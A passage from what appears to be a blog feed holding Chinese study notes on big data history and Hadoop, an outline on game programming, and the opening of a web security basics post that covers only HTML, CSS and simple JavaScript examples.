。Pig 使用类 SQL 的语法，开发者可以用 Pig 脚本描述要对大数据集上进行的操作，编译后生成 MapReduce 程序，然后在 Hadoop 上运行。编写 Pig 脚本虽然比直接 MapReduce 编程容易，但是依然需要学习新的脚本语法。于是 <em>Facebook</em> 又发布了 <code>Hive</code>。<strong>Hive 支持使用 SQL 语法来进行大数据计算</strong>，Hive 会把 SQL 语句转化成 MapReduce 的计算程序。Hive 出现后极大程度地降低了 Hadoop 的使用难度，迅速得到开发者和企业的追捧。</p><p>  随后众多 Hadoop 周边产品开始出现，<strong>大数据生态体系</strong>逐渐形成，其中包括：专门将关系数据库中的数据导入导出到 Hadoop 平台的 <code>Sqoop</code>；针对大规模日志进行分布式收集、聚合和传输的 <code>Flume</code>；MapReduce 工作流调度引擎 <code>Oozie</code> 等。</p><br><p>  在 Hadoop 早期，MapReduce 既是一个执行引擎，又是一个资源调度框架，服务器集群的资源调度管理由 MapReduce 自己完成。但是这样不利于资源复用，也使其非常臃肿。于是一个新项目启动了，将 MapReduce 执行引擎和资源调度分离开来，这就是 <code>Yarn</code>。2012 年，Yarn 成为一个独立的项目开始运营，随后被各类大数据产品支持，成为大数据平台上最主流的资源调度系统。</p><p>  同样是在 2012 年，UC 伯克利 AMP 实验室开发的 <code>Spark</code> 开始崭露头角。当时 AMP 实验室的马铁博士发现使用 MapReduce 进行机器学习计算的时候性能非常差。（因为机器学习算法通常需要进行很多次的迭代计算，而 MapReduce 每执行一次 Map 和 Reduce 计算都需要重新启动一次作业，带来大量的无谓消耗，且 MapReduce 主要使用磁盘作为存储介质）Spark 一经推出，立即受到业界的追捧，并逐步替代 MapReduce 在企业应用中的地位。</p><br><p>  一般说来 MapReduce、Spark 这类计算框架处理的业务场景都被称作<strong>批处理计算</strong>，因为它们通常针对以“天”为单位产生的数据进行一次计算，然后得到需要的结果，这中间计算需要花费的时间大概是几十分钟甚至更长的时间。因为计算的数据是非在线得到的实时数据，而是历史数据，所以这类计算也被称为<strong>大数据离线计算</strong>。</p><p>  而在大数据领域，还有另外一类应用场景，它们需要对实时产生的大量数据进行即时计算，比如对于遍布城市的监控摄像头进行人脸识别和嫌犯追踪。这类计算称为<strong>大数据流计算</strong>，相应地，有 <code>Storm、Flink、Spark Streaming</code> 等流计算框架来满足此类大数据应用的场景。 流式计算要处理的数据是实时在线产生的数据，所以这类计算也被称为<strong>大数据实时计算</strong>。</p><p>  在典型的大数据的业务场景下，数据业务最通用的做法是采用批处理的技术处理历史全量数据，采用流式计算处理实时新增数据。 Flink 这样的计算引擎可以同时支持流式计算和批处理计算。</p><br><p>  除了大数据批处理和流处理，NoSQL 系统处理的主要也是大规模海量数据的存储与访问，所以也被归为大数据技术。 NoSQL 曾经在 2011 年左右非常火爆，涌现出 <code>HBase</code>、<code>Cassandra</code> 等许多优秀的产品，其中 <code>HBase</code> 是从 Hadoop 中分离出来的、<strong>基于 HDFS 的 NoSQL 系统</strong>。</p><br><p>  <strong>大数据处理的主要应用场景包括数据分析、数据挖掘与机器学习</strong>。数据分析主要使用 <code>Hive</code>、<code>Spark SQL</code> 等 SQL 引擎完成；数据挖掘与机器学习则有专门的机器学习框架 <code>TensorFlow</code>、<code>Mahout</code>  等，内置了主要的机器学习和数据挖掘算法。此外，大数据要存入分布式文件系统要有序调度 <code>MapReduce</code> 和 <code>Spark</code> 作业执行，并能把执行结果写入到各个应用系统的数据库中，还需要有一个<strong>大数据平台</strong>整合所有这些大数据组件和企业应用系统。下图中的所有这些框架、平台以及相关的算法共同构成了<strong>大数据的技术体系</strong>。</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/technology-system-of-bd.png" alt=""></p><p>​</p><h3 id="大数据应用发展史">大数据应用发展史</h3><p>  从最开始的 Google 在搜索引擎中开始使用大数据技术，到现在无处不在的各种人工智能应用，伴随着大数据技术的发展，大数据应用也从曲高和寡走到了今天的遍地开花。</p><br><h4 id="大数据应用的搜索引擎时代">大数据应用的搜索引擎时代</h4><p>  作为全球最大的搜索引擎公司，<em>Google</em> 也是公认的大数据鼻祖，它存储着全世界几乎所有可访问的网页，数目可能超过万亿规模，全部存储起来大约需要数万块磁盘。为了将这些文件存储起来，<em>Google</em> 开发了 GFS，<strong>将数千台服务器上的数万块磁盘统一管理起来，然后当作一个文件系统，统一存储所有这些网页文件</strong>。<em>Google</em> 要构建搜索引擎，需要对所有文件中的单词进行词频统计，然后根据 PageRank 算法计算网页排名。这中间，<em>Google</em> 需要对这数万块磁盘上的文件进行计算处理，也正是基于这些需求 <em>Google</em> 又开发了 MapReduce 大数据计算框架。</p><p>  <em>Google</em> 一路走来，从搜索引擎、Gmail、地图、Android、无人驾驶，每一步都将人类的技术边界推向更高的高度。而差一点的公司即使也曾经获得过显赫的地位，但是一旦失去做事的美感和节奏感，在这个快速变革的时代，陨落得比流星还快。</p><br><h4 id="大数据应用的数据仓库时代">大数据应用的数据仓库时代</h4><p>  论文刚发表时，吸引的是 <em>Yahoo</em> 这样的搜索引擎公司和 <em>Doug Cutting</em> 这样的开源搜索引擎开发者。但是当 <em>Facebook</em> 推出 Hive 的时候，科技公司都不淡定了，他们开始意识到大数据的时代真正开启了。</p><p>  曾经我们在进行数据分析与统计时，仅仅局限于数据库，在数据库的计算环境中对数据库中的数据表进行统计分析。并且受数据量和计算能力的限制，我们只能对最重要的数据进行统计和分析。</p><p>  而 Hive 可以在 Hadoop 上进行 SQL 操作，实现数据统计与分析。<strong>我们可以用更低廉的价格获得比以往多得多的数据存储与计算能力</strong>。我们可以把运行日志、应用采集数据、数据库数据放到一起进行计算分析，获得以前无法得到的数据结果，企业的数据仓库也随之呈指数级膨胀。</p><p>  在数据仓库时代，只要有数据，几乎就一定要进行统计分析，如果数据规模比较大，我们就会想到要用 Hadoop 大数据技术。技术的发展同时又促进了技术应用，这也为接下来大数据应用走进数据挖掘时代埋下伏笔。</p><br><h4 id="大数据应用的数据挖掘时代">大数据应用的数据挖掘时代</h4><p>  大数据一旦进入更多的企业，我们就会对大数据提出更多期望，除了数据统计，我们还希望发掘出更多数据的价值，大数据随之进入数据挖掘时代。</p><p>  在商业环境中，如何解读商品间的关系并不重要，重要的是它们之间只要存在关联，就可以进行<strong>关联分析</strong>，最终目的是让用户尽可能看到想购买的商品。除了商品和商品有关系，还可以利用人和人之间的关系推荐商品。如果两个人购买的商品有很多都是类似甚至相同的，不管这两个人相隔多远他们一定有某种关系，比如可能有差不多的教育背景、经济收入、兴趣爱好。根据这种关系，可以进行关联推荐，让他们看到自己感兴趣的商品。</p><p>  更进一步，大数据还可以将每个人身上的不同特性挖掘出来，打上各种各样的标签，这些标签组成了用户画像，并且只要这样的标签足够多，就可以完整描绘出一个人，甚至比你最亲近的人对你的描述还要完整、准确。</p><p>  除了商品销售，数据挖掘还可以用于人际关系挖掘。基于六度分隔理论，<em>Facebook</em> 研究了十几亿用户的数据，试图找到关联两个陌生人之间的数字，答案是惊人的 3.57。你可以看到，各种各样的社交软件记录着我们的好友关系，通过关系图谱挖掘，几乎可以把世界上所有的人际关系网都描绘出来。</p><p>  现代生活几乎离不开互联网，各种各样的应用无时不刻不在收集数据，这些数据在后台的大数据集群中一刻不停地在被进行各种分析与挖掘。</p><br><h4 id="大数据应用的机器学习时代">大数据应用的机器学习时代</h4><p>  我们很早就发现，数据中蕴藏着规律，这个规律是所有数据都遵循的，过去发生的事情遵循这个规律，将来要发生的事情也遵循这个规律。一旦找到了这个规律，对于正在发生的事情就可以按照规律进行预测。</p><p>  在过去，我们受数据采集、存储、计算能力的限制，只能通过抽样的方式获取小部分数据，无法得到完整的、全局的、细节的规律。<strong>而现在有了大数据，可以把全部的历史数据都收集起来，统计其规律，进而预测正在发生的事情——这就是机器学习</strong>。</p><p>  把历史上人类围棋对弈的棋谱数据都存储起来，针对每一种盘面记录如何落子可以得到更高的赢面。得到这个统计规律以后，就可以利用这个规律用机器和人下棋，每一步都计算落在何处将得到更大的赢面，于是我们就得到了一个会下棋的机器人，这就是前两年轰动一时的 AlphaGo，以压倒性优势下赢了人类的顶尖棋手。</p><p>  将人类活动产生的数据，通过机器学习得到统计规律，进而可以模拟人的行为，使机器表现出人类特有的智能，这就是人工智能 AI。</p><hr><p>  <strong>大数据从搜索引擎到机器学习，发展思路其实是一脉相承的，就是想发现数据中的规律并为我们所用</strong>。所以很多人把数据称作金矿，大数据应用就是从这座蕴含知识宝藏的金矿中发掘中有商业价值的真金白银出来。</p><p>  数据中蕴藏着价值已经是众所周知的事情了，那么如何从这些庞大的数据中发掘出我们想要的知识价值，这正是大数据技术目前正在解决的事情，包括大数据存储与计算，也包括大数据分析、挖掘、机器学习等应用。</p><p>​</p><p>​</p><h3 id="大数据应用领域">大数据应用领域</h3><blockquote><p><strong>数据驱动一切</strong></p></blockquote><p>  大数据出现的时间只有十几年，被人们广泛接受并应用只有几年的时间，但就是这短短几年的时间，大数据呈现出爆炸式增长的态势。在各个领域，大数据的身影几乎无处不在。</p><p>  利用大数据和机器学习，发掘数据中的规律，进而对当前的事情做出预测和判断，使机器表现出智能的特性，正变得越来越普及。</p><br><h4 id="医疗健康领域的应用">医疗健康领域的应用</h4><p>  健康医疗领域是最近几年获得最多创业者和投资人青睐的大数据领域。</p><p>  医疗健康领域会产生大量的数据；其次，医疗健康领域有一个万亿级的市场规模；最关键的是，<strong>医疗健康领域里很多工作依赖人的经验，而这正是机器学习的强项</strong>。</p><br><p><strong>1. 医学影像智能识别</strong></p><p>  图像识别是机器学习获得的重大突破之一，使用大量的图片数据进行深度机器学习训练，机器可以识别出特定的图像元素，当然也可以识别出病理特征，比如 X 光片里的异常病灶位置。</p><p>  虽然在临床实践方面应用有限，但是医疗影像 AI 还是在一些领域取得一定的进展。医学影像智能识别，一方面可以帮助医生进行辅助诊疗，另一方面对于皮肤病等有外部表现的病症，病人可以自己拍照然后使用 AI 智能识别做一个初步诊断。</p><br><p><strong>2. 病历大数据智能诊疗</strong></p><p>  病历，特别是专家写的病历，本身就是一笔巨大的知识财富，利用大数据技术将这些知识进行处理、分析、统计、 挖掘，可以构成一个病历知识库，可以分享给更多人，即构成一个智能辅助诊疗系统。</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/framework-for-paramedical-care-system.png" alt="一个医疗辅助诊疗系统架构"></p><p>  针对同类疾病和其他上下文信息（化验结果、病史、年龄性别、病人回访信息等）可以挖掘出针对同样的疾病情况，哪种治疗手段可以用更低的治疗成本、更少的病人痛苦，获得更好的治疗效果。从上面的架构图你能看到，将这些病历知识和循证医学知识、科研文献知识、用药知识共同构成一个辅助诊疗知识库， 通过知识匹配搜索引擎可以对外提供服务。</p><p>​</p><br><h4 id="教育领域的应用">教育领域的应用</h4><p> 在传统教育过程中要做到因人施教，需要老师本身能力很强才能把握好。但是大数据在线教育利用大数据技术进行分析统计，完全可以做到根据学生能力和学习节奏，及时调整学习大纲和学习进度，提供个性化和自适应的学习体验。</p><br><p><strong>1. AI 外语老师</strong></p><p>  得益于语音识别和语音合成技术的成熟，一些在线教育网站尝试用人工智能外语老师进行外语教学。这里面的原理其实并不复杂，聊天机器人技术已经普遍应用，只要将学习的知识点设计进聊天的过程中，就可以实现一个简单的 AI 外语老师了。</p><br><p><strong>2. 智能解题</strong></p><p>  比较简单的智能解题系统其实是利用搜索引擎技术，在收集大量的试题以及答案的基础上，进行试题匹配，将匹配成功的答案返回。这个过程看起来就像智能做题一样，表面看给个题目就能解出答案，而实际上只是找到答案。</p><p>  进阶一点的智能解题系统，通过图像识别与自然语言处理进行相似性匹配。更改试题的部分数字、文字表述，但是不影响实质性解答思路，依然可以解答。</p><p>  高阶的智能解题系统，利用神经网络机器学习技术，将试题的自然语言描述转化成形式语言，然后分析知识点和解题策略，进行自动推导，从而完成实质性的解题。</p><p>​</p><br><h4 id="社交媒体领域的应用">社交媒体领域的应用</h4><p>  大数据有一个重要的、和我们大多数人密切相关，但是又不太引人注目的一个应用领域是<strong>舆情监控与分析</strong>。我们日常在各种互联网应用和社交媒体上发表各种言论，这些言论事实上反映了最准确的民情舆论。一个个体的言论基本没有意义，但是大量的、全国乃至全球的言论数据表现出的统计特性，就有了非常重要的意义。</p><p>  编写数据爬虫，实时爬取各个社交新媒体上的各种用户内容和媒体信息，然后通过自然语言处理，就可以进行情感分析、热点事件追踪等。舆情实时监控可用于商业领域，引导智能广告投放；可用于金融领域，辅助执行自动化股票、期权、数字货币交易；可用于社会管理，及时发现可能引发社会问题的舆论倾向。</p><p>​</p><br><h4 id="金融领域的应用">金融领域的应用</h4><p>  大数据在金融领域应用比较成熟的是<strong>大数据风控</strong>。在金融借贷中，如何识别出高风险用户，要求其提供更多抵押、支付更高利息、调整更低的额度，甚至拒绝贷款，从而降低金融机构的风险？事实上，金融行业已经沉淀了大量的历史数据，利用这些数据进行计算，可以得到用户特征和风险指数的曲线（即风控模型）。当新用户申请贷款的时候，将该用户特征带入曲线进行计算，就可以得到该用户的风险指数，进而自动给出该用户的贷款策略。</p><p>  利用股票、外汇等历史交易记录，分析交易规律，结合当前的新闻热点、舆论倾向、财经数据构建交易模型，进行自动化交易，这就是金融领域的量化交易。这些数据量特别巨大，交易涉及金额也同样巨大。</p><p>​</p><br><h4 id="新零售领域的应用">新零售领域的应用</h4><p>  区别于传统零售，新零售使用大数据进行全链路管理。从生产、物流、购物体验，使用大数据进行分析和预判，实现精准生产、零库存、全新的购物体验。</p><p>  亚马逊 Go 无人店使用大量的摄像头，实时捕捉用户行为，判断用户取出还是放回商品、取了何种商品等。这实际上是大数据流计算与机器学习的结合，最终实现的购物效果是，无需排队买单，进去就拿东西，拿好了就走。</p><p>  虽然无人店看起来噱头的意味更多一点，但是利用大数据技术提升购物体验、节省商家人力成本一定是正确的方向。</p><p>​</p><br><h4 id="交通领域的应用">交通领域的应用</h4><p>  交通也是一个对大数据实时采集与处理应用比较广的领域。现在几乎所有的城市路段、交通要点都有不止一个监控摄像头在实时监控，一线城市大约有百万计的摄像头在不停地采集数据。</p><p>  此外，各种导航软件也在不停采集数据，通过分析用户当前位置和移动速度，判断道路拥堵状态，并实时修改推荐的导航路径。</p><p>  还有无人驾驶技术，无人驾驶就是在人的驾驶过程中实时采集车辆周边数据和驾驶控制信息，然后通过机器学习，获得周边信息与驾驶方式的对应关系（自动驾驶模型）。然后将这个模型应用到无人驾驶汽车上，传感器获得车辆周边数据后，就可以通过自动驾驶模型计算出车辆控制信息。</p><p>​</p><p>​</p><h2 id="1-Hadoop原理与架构">1. Hadoop原理与架构</h2><p>大数据技术和传统的软件开发技术在架构思路上有很大不同，大数据技术更为关注数据，所以相关的架构设计也围绕数据展开，如何<strong>存储、计算、传输</strong>大规模的数据是要考虑的核心要素。</p><br><h3 id="数据的计算">数据的计算</h3><blockquote><p>如何解决 PB 级数据进行计算的问题呢？</p></blockquote><p>大型网站的分布式架构思路：</p><p>用大量的计算机构建一个大数据计算处理集群，利用更多的网络带宽、内存空间、磁盘容量、CPU 核心数去进行计算处理。</p><p>网站实时处理通常针对单个用户的请求操作，虽然大型网站面临大量的高并发请求，但是每个用户之间的请求是独立的，只要网站的分布式系统能将不同用户的不同业务请求分配到不同的服务器上，只要这些分布式的服务器之间耦合关系足够小，就可以通过添加更多的服务器去处理更多的用户请求及由此产生的用户数据。</p><p><strong>大数据计算处理通常针对的是网站的存量数据</strong>，也就是全部用户在一段时间内请求产生的数据，这些数据之间是有大量关联的。<strong>网站大数据系统要做的就是将这些统计规律和关联关系计算出来，并由此进一步改善网站的用户体验和运营决策</strong>。</p><p>为了解决这种计算场景的问题，技术专家们设计了一套相应的技术架构方案。</p><p>这套方案的核心思路是，既然数据是庞大的，而程序要比数据小得多，将数据输入给程序是不划算的，那么就反其道而行之，将程序分发到数据所在的地方进行计算。</p><p>在互联网时代之前，这种不断升级计算机硬件的办法还是行得通的，凭借摩尔定律，计算机硬件的处理能力每 18 个月增强一倍，越来越强大的计算机被制造出来。传统企业虽然对计算机的处理需求越来越高，但是工程师和科学家总能制造出满足需求的计算机。</p><p>但是这种思路并不适合互联网的技术要求。Google、Facebook、阿里巴巴这些网站每天需要处理数十亿次的用户请求、产生上百 PB 的数据，不可能有一台计算机能够支撑起这么大的计算需求。</p><p>于是互联网公司不得不换一种思路解决问题，当一台计算机的计算能力不能满足需求的时候，就增加一台计算机，还不够的话，就再增加一台。就这样，由一台计算机起家的小网站，逐渐成长为百万台服务器的巨无霸。Google、Facebook、阿里巴巴这些公司的成长过程都是如此。</p><p>但是买一台新计算机和一台老计算机放在一起，就能自己开始工作了吗？两台计算机要想合作构成一个系统，必须要在技术上重新架构。这就是现在互联网企业广泛使用的负载均衡、分布式缓存、分布式数据库、分布式服务等种种分布式系统。</p><p>当这些分布式技术满足互联网的日常业务需求时，对离线数据和存量数据的处理就被提了出来，当时这些分布式技术并不能满足要求，于是大数据技术就出现了。</p><p>\1. 将待处理的大规模数据存储在服务器集群的所有服务器上，主要使用 HDFS 分布式文件存储系统，将文件分成很多块（Block），以块为单位存储在集群的服务器上。</p><p>\2. 大数据引擎根据集群里不同服务器的计算能力，在每台服务器上启动若干分布式任务执行进程，这些进程会等待给它们分配执行任务。</p><p>\3. 使用大数据计算框架支持的编程模型进行编程，比如 Hadoop 的 MapReduce 编程模型，或者 Spark 的 RDD 编程模型。应用程序编写好以后，将其打包，MapReduce 和 Spark 都是在 JVM 环境中运行，所以打包出来的是一个 Java 的 JAR 包。</p><p>\4. 用 Hadoop 或者 Spark 的启动命令执行这个应用程序的 JAR 包，首先执行引擎会解析程序要处理的数据输入路径，根据输入数据量的大小，将数据分成若干片（Split），每一个数据片都分配给一个任务执行进程去处理。</p><p>\5. 任务执行进程收到分配的任务后，检查自己是否有任务对应的程序包，如果没有就去下载程序包，下载以后通过反射的方式加载程序。走到这里，最重要的一步，也就是移动计算就完成了。</p><p>\6. 加载程序后，任务执行进程根据分配的数据片的文件地址和数据在文件内的偏移量读取数据，并把数据输入给应用程序相应的方法去执行，从而实现在分布式服务器集群中移动计算程序，对大规模数据进行并行处理的计算目标。</p><h2 id="小结">小结</h2><p>移动程序到数据所在的地方去执行，这种技术方案其实我们并不陌生。从事 Java 开发的同学可能有过用反射的方式热加载代码执行的经验，如果这个代码是从网络其他地方传输过来的，那就是在移动计算。</p><p>大数据技术将移动计算这一编程技巧上升到编程模型的高度，并开发了相应的编程框架，使得开发人员只需要关注大数据的算法实现，而不必关注如何将这个算法在分布式的环境中执行，这极大地简化了大数据的开发难度，并统一了大数据的开发方式，从而使大数据从原来的高高在上，变成了今天的人人参与。</p><blockquote><p>互联网应用系统架构中有一种重要架构原则是尽量使用无状态的服务，不同服务实例之间不共享状态，也就是不持有数据，用户请求交给任何一个服务实例计算，处理的结果都是一样的，为什么要这样设计？这种架构有什么好处？</p></blockquote><h3 id="数据的存储">数据的存储</h3><h3 id="HDFS">HDFS</h3><p>​</p><h2 id="2-大数据生态体系产品原理与架构">2. 大数据生态体系产品原理与架构</h2><p>​</p><p>​</p><h2 id="4-大数据平台与系统集成">4. 大数据平台与系统集成</h2><p>​</p><p>​</p><h2 id="6-大数据算法">6. 大数据算法</h2><p>​</p><p>​</p><blockquote><p>未完待续…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏程序设计</title>
      <link href="2021/01/27/game-program-design/"/>
      <url>2021/01/27/game-program-design/</url>
      
        <content type="html"><![CDATA[<h2 id="1-游戏开发导论">1. 游戏开发导论</h2><p><strong>什么是游戏</strong></p><p><strong>电子游戏</strong><code>Electronic Game</code>，是一种在电脑、手机或其它专用电子设备上运行的，具有目标和规则的娱乐形式，简称为游戏</p><p>​</p><h3 id="1-1-游戏的发展历史">1.1 游戏的发展历史</h3><ul><li><p><strong>第一世代</strong>，1972 - 1977，代表机型：<em>Odyssey</em>、<em>Telstar</em>系列</p><p><strong>1972年</strong>是整个家用游戏主机发展的起点，第一款商业化产品<a href="https://www.bilibili.com/video/BV1pa411k7VW"><em>Odyssey</em></a>的推出标志着家用游戏主机正式迈入第一个世代</p></li><li><p><strong>第二世代</strong>，1977 - 1983，代表机型：<em>Atari 2600、ColeoVersion、Odyssey2、Color TV Game</em></p><p>8 - bit处理器，可更换式游戏的设计，标志着家用游戏主机进入第二个世代</p><p>第三方游戏合法化，由于缺乏监管标准导致出现大量垃圾游戏，最终引发了“雅达利震荡”事件</p><p>美国游戏业陷入萧条，家用市场开始由美国向日本转移</p></li><li><p><strong>第三世代</strong>，19873 - 1987，代表机型：任天堂<em>FC</em>、世嘉<em>Master System</em>、<em>Atari 7800</em></p><p>进入第三世代后，家用游戏主机的重心完全倒向日本，甚至可以说是任天堂与世嘉一对一竞争</p><p>涌现出诸如《超吸马里奥兄弟》《勇者斗龙》《最终幻想》等至今仍活跃的经典游戏系列</p><p>无论硬件产品还是软件，第三世代都是重大的转折点，对未来游系主机的发展产生了深远的影响</p></li></ul><p><img src="%E7%AC%AC%E4%B8%89%E4%B8%96%E4%BB%A3.png" alt=""></p><ul><li><p><strong>第四世代</strong>，1987-1994</p><p>家用游戏主机开始步入16 - bit芯片时代</p></li><li><p><strong>第五世代</strong>，1993-1999</p></li><li><p><strong>第六世代</strong>，1999-2004</p></li><li><p>当代，</p></li></ul><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-game-program-design%5Cimage-20210207214435080.png" alt="image-20210207214435080"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-game-program-design%5Cimage-20210207214450743.png" alt="image-20210207214450743"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-game-program-design%5Cimage-20210207214514120.png" alt="image-20210207214514120"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-game-program-design%5Cimage-20210207214600434.png" alt="image-20210207214600434"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-game-program-design%5Cimage-20210207214640136.png" alt="image-20210207214640136"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-game-program-design%5Cimage-20210207214747281.png" alt="image-20210207214747281"></p><ul><li>工具及资产管道</li></ul><img src="1111111.png" alt="1111111" style="zoom:100%;"><h3 id="运行时游戏的架构">运行时游戏的架构</h3><img src="image-20200414152947308.png" alt="image-20200414152947308" style="zoom: 50%;"><ul><li><p><code>硬件</code>：执行游戏的计算机系统或游戏主机</p><p>​基于Lunux/Windows平台的PC</p><p>​苹果的MAC</p><p>​ios/Android平台的设备</p><p>​微软的Xbox</p><p>​索尼的PlayStation系列</p><p>​任天堂的NDS/Wii/Switch</p></li><li><p><code>驱动</code>：设备驱动程序</p></li><li><p>操作系统：PC/游戏主机</p></li><li><p><code>第三方的软件开发包</code></p><p>​<strong>四大三维SDK</strong></p></li></ul><img src="image-20200414153722765.png" alt="image-20200414153722765" style="zoom:80%;"><p>​<strong>三大物理模拟引擎</strong></p><img src="D:\Git-repo\hexo\source\_posts\cs-game-program-design\image-20200414153830259.png" alt="image-20200414153830259" style="zoom:80%;"><p>​<strong>其他SDK VR</strong></p><img src="image-20200414153915613.png" alt="image-20200414153915613" style="zoom:80%;"><ul><li><code>平台独立层</code></li></ul><img src="image-20200414154019969.png" alt="image-20200414154019969" style="zoom:80%;"><ul><li><code>核心系统层</code>：抽象一些基础的框架</li></ul><p><img src="image-20200414154057557.png" alt="image-20200414154057557"></p><h2 id="2-服务器概述">2.服务器概述</h2><h2 id="3-三维几何学">3.三维几何学</h2><h2 id="4-游戏循环及实时模拟">4.游戏循环及实时模拟</h2>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全基础</title>
      <link href="2021/01/27/web-sec-basic/"/>
      <url>2021/01/27/web-sec-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="Web安全基础">Web安全基础</h2><h3 id="1-前端基础">1. 前端基础</h3><h4 id="1-1-前端开发">1.1 前端开发</h4><p>前端开发是创建Web页面或App等前端界面呈现给用户的过程</p><p>网页制作是Web1.0时代的产物，早期网站主要内容都是静态，以图片和文字为主，用户使用网站的行为也以浏览为主，随着互联网技术的发展和HTML5、CSS3的应用，现代网页更加美观，交互效果显著，功能更加强大</p><blockquote><p>**为什么前后端分离？**性能问题 &amp; 学习成本</p></blockquote><blockquote><p><strong>前后端的走向？</strong></p><p>前端：页面表现，速度流畅，兼容性，用户体验等等</p><p>后端：三高（高并发，高可用，高性能），安全，存储，业务等等</p></blockquote><h4 id="1-2-HTML入门">1.2 HTML入门</h4><h5 id="HTML介绍">HTML介绍</h5><p>HTML（ <code>HyperText Markup Language</code>）即超文本标记语言，是用来构建网页的一种语言</p><ul><li><p>HTML是一整套标记标签构成的标记语言，而非编程语言</p></li><li><p>HTML用于承载网页的内容（文本、图片、语音、视频）</p></li><li><p>通俗的讲：使用HTML标记标签与纯文本按规则构建的文档，通常也称为网页</p></li><li><p>浏览器对HTML文档解析，根据标签的顺序，按指定标签对应的规则显示纯文本内容</p></li></ul><h5 id="HTML网页结构">HTML网页结构</h5><p>一个标准的HTML页面由以下三个部分组成</p><ul><li><p>HTML版本声明：不是 HTML 标签，而是指示浏览器关于页面使用哪个 HTML 版本进行编写的指令</p></li><li><p>HTML头部：涉及页面标题、字符集、样式、链接等内容</p></li><li><p>HTML主体：浏览器展现给用户的内容，包括标题、文本、段落、链接、图片、媒体等，所有的页面内容都由HTML主体部分标签来实现</p></li></ul><h5 id="HTML标签-元素-属性">HTML标签/元素/属性</h5><h4 id="1-3-CSS入门">1.3 CSS入门</h4><p>层叠样式表（<code>Cascading Style Sheets</code>）是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言</p><ul><li>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力</li></ul><h4 id="1-4-JavaScript-入门">1.4 JavaScript 入门</h4><p>JavaScript，是可插入 HTML 页面，可以由绝大多数现代浏览器执行的轻量级的编程语言。</p><ul><li><p>是基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格</p></li><li><p>Node.js：简单的说 Node.js 就是运行在服务端的 JavaScript</p><ul><li><p>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。</p></li><li><p>Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎</p></li></ul></li></ul><h5 id="JavaScript-功能">JavaScript 功能</h5><ul><li>做出反应</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>first<span class="token punctuation">"</span></span><span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Welcome，hello world!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>做出反应<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>改变HTML内容</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>second<span class="token punctuation">"</span></span><span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>changeContent();<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>改变HTML内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>change<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>开始了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">changeContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"change"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查找元素 </span>x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"开始很久了，已经结束了"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>改变HTML样式</li><li>验证输入</li></ul><h3 id="2-Web-App简介">2. Web App简介</h3><p>Web 